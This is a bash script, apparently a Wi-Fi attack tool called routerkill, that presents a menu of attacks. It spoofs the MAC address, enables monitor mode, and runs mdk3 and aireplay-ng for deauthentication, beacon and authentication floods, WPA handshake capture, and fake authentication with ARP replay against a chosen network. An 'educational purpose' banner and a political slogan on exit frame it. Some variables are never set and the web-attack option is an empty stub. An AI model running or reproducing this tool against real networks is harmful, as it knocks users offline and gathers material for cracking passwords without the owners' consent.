#!/bin/bash
echo " ONLY FOR EDUCATIONAL PURPOSE "
# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

s="s"


function ctrl_c() {
echo -e "You pressed CTRL + C. Exiting the program.."
sleep 2
checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
#Verification mode monitor and exit
if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "Monitor mode stopped.."
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "Monitor mode stopped.."
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "Monitor mode stopped.."
sleep 1
fi
echo -e "Thank you"
sleep 1
exit

}


case `dpkg --print-architecture` in
aarch64)
echo -e "Error: The script only supports AMD 64 architecture Debian systems and derivatives"
exit
;;
arm)
echo -e "Error: The script only supports AMD 64 architecture Debian systems and derivatives"
exit
;;
armhf)
echo -e "Error: The script only supports AMD 64 architecture Debian systems and derivatives"
exit
;;

i*86)
echo -e "Error: The script only supports AMD 64 architecture Debian systems and derivatives"
exit
;;
x86_64)
echo -e "Error: The script only supports AMD 64 architecture Debian systems and derivatives"
exit
;;
esac




#Menu options

a="Deauth Attack"
b="Fake Point"
c="Auth Attack"
new="Inject Packets"
d="Stop monitor mode"
e="Capture Handshake"
new2="Web Attacks"
update="Update Program"
f="Exit Program"


#Main menu

PS3="(*) Choose an option: "
select menu in "$a" "$b" "$c" "$new" "$d" "$e" "$new2" "$update" "$f";
do
case $menu in 

$a)
echo -e "This Attack will deauthenticate all clients within the network"
sleep 2
echo -e "Showing available network interfaces"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
printf "Enter your interface: "
read interface
#cambio de dirección mac
echo -e "We will now bring down your interface to spoof your MAC address"
sleep 2
ifconfig $interface down
echo -e "Spoofing your MAC address!!"
sleep 2
macchanger -r $interface
ifconfig $interface up
echo -e "Your MAC address has been successfully spoofed!!"
sleep 2
echo -e "Now we will start monitor mode on your interface"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "Monitor mode started successfully"
sleep 2
echo -e "Now we will analyze the available networks"
sleep 2
echo -e "WARNING: Wait 10 seconds when the analysis starts"
sleep 9
timeout --foreground 12s airodump-ng $interface$mon
echo
echo
printf "Enter the BSSID of the network: "
read bssid
printf "Enter the channel of the network (CH): "
read ch
sleep 2
printf "Enter the name of the txt file to save the BSSID: "
read doc
echo $bssid > $doc
sleep 2
printf "Add the duration of the attack in seconds: "
read sec
sleep 2
echo -e "The attack will be performed on BSSID: $bssid on Channel: $ch"
sleep 2
echo -e "The attack will start in 5 seconds.."
sleep 1
echo "4 seconds.."
sleep 1
echo "3 seconds.."
sleep 1
echo "2 seconds.."
sleep 1
echo "1 second"
sleep 1
echo -e "Attack Started.. Remaining attack time: $sec Seconds"
timeout --foreground $sec$s mdk3 $interface$mon d -b $doc -c $ch
echo -e "The attack has finished.."
sleep 2
echo -e "Stopping monitor mode"
sleep 2
airmon-ng stop $interface$mon
;;

$b)
echo -e "This Attack will create a flood of WIFI networks"
sleep 2
echo -e "Showing available network interfaces"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "Enter your interface: "
read interface
sleep 2
echo -e "Now we will start monitor mode on your interface"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "Monitor mode started successfully"
echo
printf "Enter the attack duration in seconds: "
read sec
sleep 2
echo -e "The attack will start in 5 seconds.."
sleep 1
echo "4 seconds"
sleep 1
echo "3 seconds"
sleep 1
echo "2 seconds"
sleep 1
echo "1 seconds"
sleep 1
echo -e "Attack Started.. Remaining attack time: $sec Seconds"
timeout --foreground $sec$s mdk3 $interface$mon b
echo -e "The attack has finished.."
sleep 2
echo -e "Stopping monitor mode"
sleep 2
airmon-ng stop $interface$mon
;;


$c)
echo -e "This Attack will flood the router with connection attempts"
sleep 2
echo -e "Showing available network interfaces"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "Enter your interface: "
read interface
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "Monitor mode started successfully"
sleep 2
echo -e "Now we will analyze the available networks"
sleep 2
echo -e "WARNING: Wait 20 seconds when the analysis starts"
sleep 9
timeout --foreground 20s airodump-ng $interface$mon
echo
printf "Enter the BSSID of the network: "
read bssid
sleep 2
printf "Enter a name to save in txt: "
read doc
echo $bssid > $doc
echo
printf "Enter the channel of the network (CH): "
read ch
printf "Enter the ESSID of the network: "
read essid	
sleep 1
read -p "Enter the attack duration in seconds: " sec
sleep 2
echo -e "The attack will start in 5 seconds..."
sleep 1
echo "4 seconds"
sleep 1
echo "3 seconds"
sleep 1
echo "2 seconds"
sleep 1
echo "1 seconds"
sleep 1
echo -e "Attack Started.. Remaining attack time: $sec Seconds"
sleep 2
timeout --foreground $sec$s mdk3 $interface$mon a -a $doc
echo -e "The attack has finished.."
sleep 2
echo -e "Stopping monitor mode"
sleep 2
airmon-ng stop $interface$mon
;;

$new)
echo -e "This Attack will flood the router with connection attempts"
sleep 2
echo -e "Showing available network interfaces"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "Enter your interface: "
read interface
echo -e "Modifying your MAC address"
ifconfig $interface down
macchanger -r $interface
val=$(ifconfig $interface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
echo -e "MAC address spoofed"
sleep 2
echo -e "Starting monitor mode on your interface"
sleep 3
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "Monitor mode started successfully"
sleep 2
echo -e "Now we will analyze the available networks"
sleep 2
echo -e "WARNING: Wait 25 seconds when the analysis starts"
sleep 9
timeout --foreground 25s airodump-ng $interface$mon
echo
printf "Enter the BSSID of the victim: "
read bssid
sleep 2
printf "Enter the channel of the network (CH): "
read ch
printf "Enter the duration of the attack (deauth) in seconds: "
read sec
sleep 2
echo -e "The attack will start in 5 seconds..."
sleep 1
echo "4 seconds"
sleep 1
echo "3 seconds"
sleep 1
echo "2 seconds"
sleep 1
echo "1 seconds"
sleep 1
timeout --foreground 2s airodump-ng --bssid $bssid -c $ch $interface$mon
echo -e "Executing xterm in 5 seconds..."
sleep 5
timeout --foreground 30s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon" & 
timeout --foreground 60s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" 
echo -e "Handshake captured successfully PATH: handshake/$doc.cap"
sleep 4
echo -e "The attack has finished.."
sleep 2
echo -e "Stopping monitor mode"
sleep 2
airmon-ng stop $interface$mon
;;


$d)
checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')

#Verification mode monitor and exit

if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "Monitor mode stopped.."
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "Monitor mode stopped.."
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "Monitor mode stopped.."
sleep 1
fi
echo -e "Returning to the main menu"
sleep 2
;;

$e)
echo -e "This Attack will capture a handshake from a network"
sleep 2
echo -e "Showing available network interfaces"
sleep 2
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "Enter your interface: "
read interface
echo -e "Starting monitor mode on your interface"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "Monitor mode started successfully"
sleep 2
echo -e "Now we will analyze the available networks"
sleep 2
echo -e "WARNING: Wait 20 seconds when the analysis starts"
sleep 9
timeout --foreground 20s airodump-ng $interface$mon
echo
echo
printf "Enter the BSSID of the network: "
read bssid
sleep 2
printf "Enter the channel of the network (CH): "
read ch
sleep 2
printf "Enter a name to save in txt: "
read doc
echo $bssid > $doc
sleep 2
read -p "Enter the attack duration in seconds: " sec
sleep 2
echo -e "The attack will start in 5 seconds..."
sleep 1
echo "4 seconds"
sleep 1
echo "3 seconds"
sleep 1
echo "2 seconds"
sleep 1
echo "1 seconds"
sleep 1
echo -e "Attack Started.. Remaining attack time: $sec Seconds"
sleep 2
timeout --foreground $sec$s xterm -hold -e "airodump-ng --bssid $bssid -c $ch  $interface$mon" & 
sleep 1
timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --fakeauth 2 -a $bssid -c $val $interface$mon" &
sleep 1
timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --arpreplay -b $bssid -h $val $interface$mon"
echo -e "The attack has finished.."
sleep 2
echo -e "Stopping monitor mode"
sleep 2
airmon-ng stop $interface$mon
;;

$new2)
echo -e "Please wait.."
sleep 3
echo
echo
echo "Cloning Site"
echo "Find panel"
echo "Check SQLI"
echo "Back to menu"
;;

$update)
echo -e "Checking internet connection.. please wait.."
sleep 4
if ping -q -w 1 -c 1 google.com > /dev/null; then
echo -e "Updating program.. in 5 seconds.."
sleep 5 
if [ -e $directory/routerkill.sh ]
then
rm $directory/routerkill.sh
fi
curl https://raw.githubusercontent.com/byteSalgado/router-kill/master/routerkill.sh > routerkill.sh
echo -e "Program Updated.. Please run it again.."
sleep 2
exit                                                                                                                                                                
else 
echo
echo
echo -e "Internet not available.. exiting.." 
exit                                                                                                                                                              
fi       
;;

$f)
checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')

#Verification mode monitor and exit

if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "Monitor mode stopped.."
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "Monitor mode stopped.."
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "Monitor mode stopped.."
sleep 1
fi
echo -e " Khalafa is the only solution "
sleep 2
exit
;;

*)
echo -e "Invalid option"
;;
esac 
done
